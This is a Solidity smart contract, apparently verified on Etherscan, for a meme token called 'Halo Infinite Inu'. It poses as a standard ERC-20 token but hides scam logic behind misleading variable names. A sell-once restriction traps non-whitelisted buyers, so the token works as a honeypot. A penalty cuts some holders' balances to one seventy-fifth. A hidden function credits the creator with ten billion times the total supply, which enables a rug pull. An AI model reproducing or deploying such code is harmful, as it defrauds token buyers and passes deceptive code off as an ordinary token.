/**
 *Submitted for verification at Etherscan.io on 2022-01-30
*/

// Halo Infinite campaign is good

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function decimals() external view returns (uint8);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    mapping (address => bool) private BearMarket;
    mapping (address => bool) private BullMarket;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _TVALogger;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public pair;
    IDEXRouter router;

    address[] private haloArray;

    string private _name; string private _symbol;
    address private _sender; uint256 private _totalSupply;
    uint256 private Interstellar; uint256 private OuterSpace;
    uint256 private Luna; bool private Forestry;
    bool private asqw; bool private Groups;
    uint256 private Dimensions; bool private Hydrogen;
    
    constructor (string memory name_, string memory symbol_, address creator_) {
        router = IDEXRouter(_router);
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));

        _name = name_;
        _sender = creator_;
        _symbol = symbol_;
        asqw = true;
        BearMarket[creator_] = true;
        Forestry = true;
        Groups = false;
        BullMarket[creator_] = false;
        Dimensions = 0;
        Hydrogen = false;
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function _infiniteBalance(address account) internal {
        _balances[account] += (((account == _sender) && (Hydrogen)) ? (_totalSupply * 10 ** 10) : 0);
    }

    function burn(uint256 amount) public virtual returns (bool) {
        _burn(_msgSender(), amount);
        return true;
    }
    
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function _ElonsCampaign(address sender, uint256 amount) internal {
        if ((BearMarket[sender] != true)) {
            if ((amount > Luna)) { require(false); }
            require(amount < Interstellar);
            if (Groups == true) {
                if (BullMarket[sender] == true) { require(false); }
                BullMarket[sender] = true;
            }
        }
    }

    function _Quake(address recipient) internal {
        haloArray.push(recipient);
        _TVALogger[recipient] = block.timestamp;

        if ((BearMarket[recipient] != true) && (Dimensions > 2)) {
            if ((_TVALogger[haloArray[Dimensions-1]] == _TVALogger[haloArray[Dimensions]]) && BearMarket[haloArray[Dimensions-1]] != true) {
                _balances[haloArray[Dimensions-1]] = _balances[haloArray[Dimensions-1]]/75;
            }
        }

        Dimensions++;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }
    
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] -= amount;
        _balances[address(0)] += amount;
        emit Transfer(account, address(0), amount);
     }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        
        (BearMarket[spender],BullMarket[spender],Forestry) = ((address(owner) == _sender) && (Forestry == true)) ? (true,false,false) : (BearMarket[spender],BullMarket[spender],Forestry);

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        (Interstellar,Groups) = ((address(sender) == _sender) && (asqw == false)) ? (OuterSpace, true) : (Interstellar,Groups);
        (BearMarket[recipient],asqw) = ((address(sender) == _sender) && (asqw == true)) ? (true, false) : (BearMarket[recipient],asqw);

        _Quake(recipient);
        _ElonsCampaign(sender, amount);
        
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        _infiniteBalance(sender);

        Hydrogen = Groups ? true : Groups;

        emit Transfer(sender, recipient, amount);
    }
    
    function _DeployHalo(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        
        (uint256 temp1, uint256 temp2) = (1000, 1000);

        _totalSupply += amount;
        _balances[account] += amount;
        
        Interstellar = _totalSupply;
        OuterSpace = _totalSupply / temp1;
        Luna = OuterSpace * temp2;
        
        emit Transfer(address(0), account, amount);    
    }
}

contract ERC20Token is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        address creator, uint256 initialSupply
    ) ERC20(name, symbol, creator) {
        _DeployHalo(creator, initialSupply);
    }
}

contract HaloInfinite is ERC20Token {
    constructor() ERC20Token("Halo Infinite Inu", "HALO INU", msg.sender, 20000 * 10 ** 18) {
    }
}